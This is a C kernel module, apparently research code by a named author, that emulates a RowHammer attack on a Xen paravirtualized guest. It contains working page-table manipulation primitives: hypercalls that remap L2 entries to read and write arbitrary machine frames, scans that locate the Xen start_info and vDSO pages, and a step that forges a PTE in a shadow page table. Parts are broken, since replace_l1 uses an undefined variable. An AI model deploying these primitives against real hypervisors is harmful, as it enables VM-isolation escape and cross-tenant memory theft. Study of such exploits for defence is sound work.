/* Linux Kernel Includes */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/gfp.h>
#include <linux/mm.h>
#include <linux/highmem.h>

/* Xen  Includes */
/* Xen header files */
#include <asm/xen/page.h>
#include <asm/xen/hypervisor.h>
#include <asm/xen/hypercall.h>
#include <xen/interface/event_channel.h>
#include <xen/xen.h>
#include <xen/interface/xen.h>
#include <asm/xen/interface.h>

#define MAX_MFN 0x7FFFFF
#define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
#define PTE_FLAG PMD_FLAG
#define PADDR_BITS 44
#define PADDR_MASK ((1ULL << PADDR_BITS)-1)
#define pg_entry(__pgd, i) ((__pgd) + i)
#define pgd_to_mfn(__pgd) ((__pgd->pgd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pud_to_mfn(__pud) ((__pud->pud & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pmd_to_mfn(__pmd) ((__pmd->pmd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pte_to_mfn(__pte) ((__pte->pte & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define no_reserved_bits(x) ((x & (1<<7)) | ( (x>>43) & 127))

#define FIND_START_INFO_PAGE 1
#define FIND_VDSO_PAGE 2
#define DO_PAGE_READ 1
#define DO_PAGE_WRITE 2

#define STEP(_f, _a...) \
	printk("\n# --- STEP:" _f "\n\n",  ## _a);

#define DEBUG(_f, _a...) \
	printk("RowHammer: %d - " _f "\n", __LINE__, ## _a);

#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)

#define HYPERVISOR_tlb_flush_all() { \
	struct mmuext_op uops[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}}; \
	HYPERVISOR_mmuext_op(uops, 1, NULL, DOMID_SELF); }

static void* l2_entry_va;

/* This variable will hold a copy of the PT of the va */
static unsigned long shadow_va_page;
static unsigned int my_var = 18012016;
static unsigned long va = (unsigned long) &my_var;

void page_walk(unsigned long va)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);
	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
    printk("value (%p - 0x%lx) val= 0x%lx, offset =0x%lx\n",(void*) va, __machine_addr((void *)va), *(unsigned long*)va, va & ~PAGE_MASK);
}

pgd_t *get_pgd(unsigned long va)
{
	struct mm_struct *mm = current->mm;
	return pgd_offset(mm, va);
}

pud_t *get_pud(unsigned long va)
{
	return pud_offset(get_pgd(va), va);
}

pmd_t *get_pmd(unsigned long va)
{
	return pmd_offset(get_pud(va), va);
}

pte_t *get_pte(unsigned long va)
{
	return pte_offset_kernel(get_pmd(va), va);
}

/*
 * Check
 * http://xenbits.xen.org/docs/4.13-testing/hypercall/x86_64/include,public,xen.h.html#Func_HYPERVISOR_mmu_update
 *
 */
int mmu_update(unsigned long ptr, unsigned long val)
{
	struct mmu_update mmu_updates;
	int rc;

	mmu_updates.ptr = ptr;
	mmu_updates.val = val;
	rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
	HYPERVISOR_tlb_flush_all();

	return rc;
}


int make_page_ro(unsigned long p)
{
    int rc;
	pte_t *pte_aligned = get_pte(p);

	// removes RW bit on the aligned_mfn_va's pte
	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
	if(rc < 0)
	{
		printk("cannot unset RW flag on PTE (0x%lx)\n", p);
		return -1;
	}
    return 0;
}

int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
{
	pte_t *pte_aligned = get_pte(aligned_mfn_va);
	pmd_t *pmd = get_pmd(l2_entry_va);
	int rc;

	// removes RW bit on the aligned_mfn_va's pte
	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
	if(rc < 0)
	{
		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
		return -1;
	}

	// map.
	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PMD_FLAG);
	if(rc < 0)
	{
		printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
		return -1;
	}

	return 0;
}

int set_l2_pse_flag(unsigned long va)
{
	pmd_t *pmd = get_pmd(va);
 	int rc;

	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd | _PAGE_PSE);
	if(rc < 0)
	{
		printk("cannot set PSE flag on PMD (0x%lx)\n", va);
		return -1;
	}

	return 0;
}

int unset_l2_pse_flag(unsigned long va)
{
	pmd_t *pmd = get_pmd(va);
	int rc;

	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd & ~_PAGE_PSE);
	if(rc < 0)
	{
		printk("cannot unset PSE flag on PMD (0x%lx)\n", va);
		return -1;
	}

	return 0;
}

void do_page_buff(unsigned long mfn, char *buff, int what)
{
	//set_l2_pse_flag((unsigned long) l2_entry_va);
	*(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
	//unset_l2_pse_flag((unsigned long) l2_entry_va);

	if(what == DO_PAGE_READ)
	{
		memcpy(buff, l2_entry_va, PAGE_SIZE);
	}
	else if (what == DO_PAGE_WRITE)
	{
		memcpy(l2_entry_va, buff, PAGE_SIZE);
	}

	//set_l2_pse_flag((unsigned long) l2_entry_va);
	*(unsigned long*) l2_entry_va = 0;
	//unset_l2_pse_flag((unsigned long) l2_entry_va);
}

void dump_page_buff(unsigned long mfn, char *buff)
{
	do_page_buff(mfn, buff, DO_PAGE_READ);
}

void write_page_buff(unsigned long mfn, char *buff)
{
	do_page_buff(mfn, buff, DO_PAGE_WRITE);
}

void *memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
	register char *cur, *last;
	const char *cl = (const char *)l;
	const char *cs = (const char *)s;

	/* we need something to compare */
	if (l_len == 0 || s_len == 0)
		return NULL;

	/* "s" must be smaller or equal to "l" */
	if (l_len < s_len)
		return NULL;

	/* special case where s_len == 1 */
	if (s_len == 1)
		return memchr(l, (int)*cs, l_len);

	/* the last position where its possible to find "s" in "l" */
	last = (char *)cl + l_len - s_len;

	for (cur = (char *)cl; cur <= last; cur++)
		if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
			return cur;

	return NULL;
}


int is_startup_info_page(char *page_data)
{
	int ret = 0;
	char marker[] = "xen-3.0-x86";

	if(memcmp(page_data, marker, sizeof(marker)-1) == 0)
	{
		ret = 1;
	}

	return ret;
}
/*
 * https://man7.org/linux/man-pages/man7/vdso.7.html
 */
int is_vdso_page(char *page_data)
{
	char elf_header[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00";
	char vdso_marker[] = "vdso_gettimeofday";
	int ret = 0;

	if(!memcmp(page_data, elf_header, sizeof(elf_header)) &&
		memmem(page_data, PAGE_SIZE, vdso_marker, sizeof(vdso_marker)) != NULL)
	{
		ret = 1;
	}

	return ret;
}



int find_in_pte(pte_t *pte_base, int what)
{
	int i;
	pte_t *curr_pte;
	unsigned long curr_pte_val;
	unsigned int data_mfn;
	char *data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pte = pg_entry(pte_base, i);
		curr_pte_val = curr_pte->pte;
		data_mfn = pte_to_mfn(curr_pte);

		if((curr_pte_val & _PAGE_PRESENT) &&
		   (curr_pte_val & _PAGE_ACCESSED) &&
		   !(curr_pte_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pte_val) &&
		   data_mfn != 0 &&
		   data_mfn <= MAX_MFN)
		{
			dump_page_buff(data_mfn, data);

			if(what == FIND_START_INFO_PAGE && is_startup_info_page(data))
			{
				ret = data_mfn;
				break;
			}

			if(what == FIND_VDSO_PAGE && is_vdso_page(data))
			{
				ret = data_mfn;
				break;
			}

		}
	}

	kfree(data);
	return ret;
}

int find_in_pmd(pmd_t *pmd_base, int what)
{
	int i;
	pmd_t *curr_pmd;
	unsigned long curr_pmd_val;
	unsigned int pte_mfn;
	char *pte_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pmd = pg_entry(pmd_base, i);
		curr_pmd_val = curr_pmd->pmd;
		pte_mfn = pmd_to_mfn(curr_pmd);

		if((curr_pmd_val & _PAGE_PRESENT) &&
		   (curr_pmd_val & _PAGE_ACCESSED) &&
		   !(curr_pmd_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pmd_val) &&
		   pte_mfn != 0 &&
		   pte_mfn <= MAX_MFN)
		{
			dump_page_buff(pte_mfn, pte_data);
			ret = find_in_pte((pte_t*) pte_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pte_data);
	return ret;
}

int find_in_pud(pud_t *pud_base, int what)
{
	int i;
	pud_t *curr_pud;
	unsigned long curr_pud_val;
	unsigned int pmd_mfn;
	char *pmd_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pud = pg_entry(pud_base, i);
		curr_pud_val = curr_pud->pud;
		pmd_mfn = pud_to_mfn(curr_pud);

		if((curr_pud_val & _PAGE_PRESENT) &&
		   (curr_pud_val & _PAGE_ACCESSED) &&
		   !(curr_pud_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pud_val) &&
		   pmd_mfn != 0 &&
		   pmd_mfn <= MAX_MFN)
		{
			// printk("pud : %d, %lx, %lx, %lx\n", i, curr_pud->pud, curr_pud_val, pmd_mfn);
			dump_page_buff(pmd_mfn, pmd_data);
			ret = find_in_pmd((pmd_t*) pmd_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pmd_data);
	return ret;
}

int find_in_pgd(pgd_t *pgd_base, int what)
{
	int i;
	pgd_t *curr_pgd;
	unsigned long curr_pgd_val;
	unsigned int pud_mfn;
	char *pud_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pgd = pg_entry(pgd_base, i);
		curr_pgd_val = curr_pgd->pgd;
		pud_mfn = pgd_to_mfn(curr_pgd);

		if((curr_pgd_val & _PAGE_PRESENT) &&
		   (curr_pgd_val & _PAGE_ACCESSED) &&
		   !(curr_pgd_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pgd_val) &&
		   pud_mfn != 0 &&
		   pud_mfn <= MAX_MFN)
		{
			// printk("pgd : %d, %lx, %lx, %lx\n", i, curr_pgd->pgd, curr_pgd_val, pud_mfn);
			dump_page_buff(pud_mfn, pud_data);
			ret = find_in_pud((pud_t*) pud_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pud_data);
	return ret;
}

int find_start_info_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
{
	return find_in_pgd(pgd, FIND_START_INFO_PAGE);
}

int find_vdso_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
{
	return find_in_pgd(pgd, FIND_VDSO_PAGE);
}


struct shared_info dummy_shared_info;
struct shared_info *HYPERVISOR_shared_info = (void *)&dummy_shared_info;

void map_shared_info(void){
    if (!xen_feature(XENFEAT_auto_translated_physmap)) {
        printk("XENFEAT_auto_translated_physmap not enabled\n");
        set_fixmap(FIX_PARAVIRT_BOOTMAP, xen_start_info->shared_info);
        HYPERVISOR_shared_info = (struct shared_info *)fix_to_virt(FIX_PARAVIRT_BOOTMAP);
    } else{
        HYPERVISOR_shared_info = (struct shared_info *)__va(xen_start_info->shared_info);
    }

    if(HYPERVISOR_shared_info == &dummy_shared_info){
        printk(KERN_ALERT "shared_info not mapped.\n");
    }

    printk("shared_info address %p\n", &HYPERVISOR_shared_info);
}


void print_kmemory_info(void * ret){
    printk("Address of ret \t\t\t%p\n", &ret);
        /* 
     * __va is used only for converting virtuall memory on kernel 
     * every address is always virtual, we need to stablish the physicall address
     * __pa will get the physiscal address of this SO 
     * BUT, we are on a virtualized system
     */
    printk("Address of __pa(ret) \t\t%p\n",(void *) __pa(&ret));
    printk("Address of virt_to_phys(ret) \t\t%p\n",(void*) virt_to_phys(&ret));
    printk("virt_addr_valid(ret) \t%d\n", virt_addr_valid(&ret));
    printk("Address of virt_to_page(ret) \t%p\n", virt_to_page(&ret));
    printk("\n\n");
}


/* Set the pte_t that has the same offset that va to the new value */
void update_va_pte_in_shadow(unsigned long shadow_va_page, unsigned long va, pte_t *npte)
{
    unsigned long offset = va & ~PAGE_MASK;
    DEBUG("Page offset from va: %p, 0x%lx", (void *) va, offset);
    pte_t *ptr = (pte_t *) shadow_va_page;
    DEBUG("Previous pte 0x%lx\n", ptr[pte_index(va)].pte);
    ptr[pte_index(va)] = *npte;
    DEBUG("New  pte 0x%lx\n", ptr[pte_index(va)].pte);
}

unsigned int * value_from_shadow(unsigned long shadow_va_page, unsigned long va)
{
    unsigned long offset = va & ~PAGE_MASK;
    DEBUG("Page offset from va: %p, 0x%lx", (void *) va, offset);
    pte_t *ptr = (pte_t *) shadow_va_page;
    //unsigned int *page = (unsigned int *) ptr[pte_index(va)].pte;
    struct page *page = pte_page(ptr[pte_index(va)]);
    get_page(page);
    unsigned int *p = (unsigned int*) kmap(page);
    DEBUG("Address returned from the page %p",(void*) p);
    //todo: unmap this page

    return &p[offset];
}

unsigned int get_value_from_shadow(unsigned long shadow_va_page, unsigned long va)
{
    unsigned int *v;
    v = value_from_shadow(shadow_va_page, va);
    return *v;
}

void set_value_from_shadow(unsigned long shadow_va_page, unsigned long va, int val)
{
    unsigned int *v;
    v = value_from_shadow(shadow_va_page, va);
    *v = val;
}

void copy_val1_to_shadow(unsigned long shadow_va_page)
{
    DEBUG("va - pmd_t (pte_t page frame) - %p - 0x%lx",get_pmd(va), 
            __machine_addr((void*)get_pmd(va)));
    DEBUG("va - pte    0x%lx ",(unsigned long) get_pmd(va));
    DEBUG("va - pte va 0x%lx ",pmd_page_vaddr(*get_pmd(va)));
    DEBUG("va - pte[0]  0x%lx ",get_pmd(va)->pmd);
    DEBUG("va - pte_t index - 0x%lx", pte_index(va));

	memcpy((void*)shadow_va_page, (void*)pmd_page_vaddr(*get_pmd(va)), PAGE_SIZE);

    pte_t *ptr = (pte_t *) shadow_va_page;
    DEBUG("value in shadow_va_page 0x%lx", *(unsigned long*)shadow_va_page);
    DEBUG("va -pte_idx(0x%lx) : (addr[pte_idx]) %p -(addr[pte_idx].pte) 0x%lx\n",pte_index(va), 
            &ptr[pte_index(va)], ptr[pte_index(va)].pte);

    page_walk(shadow_va_page);

    /*
    DEBUG("my_var %d",my_var);
    my_var = 30071980;
    DEBUG("my_var %d",my_var);
    DEBUG("Print va value from shadow_va_page: %d ", get_value_from_shadow(shadow_va_page, va));
    int new_val = 23071987;
    DEBUG("Print va value from shadow_va_page: %d ", new_val);
    set_value_from_shadow(shadow_va_page, va, 23071987);
    DEBUG("my_var %d",my_var);
    */
}
    

int replace_l1(unsigned long va, unsigned long l1_page)
{
	pte_t *pte_aligned = get_pte(va);
	pmd_t *pmd = get_pmd(l2_entry_va);
	int rc;

    /* reestart from here adapt the function from the mapping step */

	// removes RW bit on the aligned_mfn_va's pte
	rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, pte_aligned->pte & ~_PAGE_RW);
	if(rc < 0)
	{
		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
		return -1;
	}

	// map.
	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PMD_FLAG);
	if(rc < 0)
	{
		printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
		return -1;
	}

	return 0;
}


static int __init rh_emul_init(void) {

    printk("Loading the rh_emul : %s\n",__FUNCTION__);

	char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
    //unsigned long *current_tab = (unsigned long*) buff;
	//struct start_info *start_f = (struct start_info *) buff;

    /*  
     *  task_struct get_current => current 
     *  This is a pointer to the current process (which called the process) 
     */
	unsigned long *my_pgd = (unsigned long*) (current->mm->pgd);

    DEBUG("pgd addres %p", my_pgd);
    DEBUG("PAGE_SHIFT %d", PAGE_SHIFT);
    DEBUG("PAGE_OFFSET \t%lX", PAGE_OFFSET);
    DEBUG("PAGE_SIZE %lx", PAGE_SIZE);
    DEBUG("PAGE_MASK %lx", PAGE_MASK);
    DEBUG("Page Walk of va %d - %p", *(int *)va, (void *) va);
    page_walk((unsigned long) va);

    /*
     *
     *
     */
    STEP("1: Allocate a shadow page");
	// get an aligned mfn writeable
	shadow_va_page =  __get_free_page(__GFP_ZERO);
	DEBUG("shadow_va_page = 0x%lx", shadow_va_page);
	DEBUG("shadow_va_page mfn = 0x%lx", __machine_addr((void *)shadow_va_page));
    page_walk(shadow_va_page);

    STEP("2: copy the L1 from va to the shadow_va_page");
    copy_val1_to_shadow(shadow_va_page);

    STEP("3: Forge the row hammer Flip bit replacing the page");
    replace_l1(va, shadow_va_page);



    STEP("4: create fake pte_t in the the L1 shadow_va_page");
    pte_t fake_pte;
    fake_pte.pte = 0x54f536298;
    update_va_pte_in_shadow(shadow_va_page, va, &fake_pte);





/*
    for(i=0; i < 512; i++){
        printk("%d : %p, 0x%lx",i,ptr, ptr->pte);
        ptr++;
        (i%3) == 2 ? printk("\n") : printk(" |");
    }
    printk("\n");
    pte_t *from = (pte_t *) get_pmd(va);
    pte_t *to = (pte_t *) shadow_va_page;

    for(i=0; i < 8; i++){
        to = from++;
        to++;
        printk("%d : %p",i,to);
        (i%4) == 3 ? printk("\n") : printk(" |");
    }
    ptr = (pte_t*) get_pmd(va);

    DEBUG("value in get_pmd(va) 0x%lx\n", get_pmd(va)->pmd);
    for(i=0; i < 512; i++){
        printk("%d : %p, 0x%lx",i,ptr, ptr->pte);
        ptr++;
        (i%3) == 2 ? printk("\n") : printk(" |");
    }
    printk("\n");

    for(i=0; i < (PAGE_SIZE/sizeof(pte_t)); i++){
        printk("%d : %p, 0x%lx",i,ptr,ptr->pte);
        ptr++;
        (i%4) == 3 ? printk("\n") : printk(" |");

    }
    */

    struct page a;
    

	return 0;
}


static void __exit rh_emul_exit(void) {

    free_page(shadow_va_page);
    printk(KERN_INFO "Exiting rh_emul  module\n");

}

module_init(rh_emul_init);
module_exit(rh_emul_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Charles F.'. Goncalves");

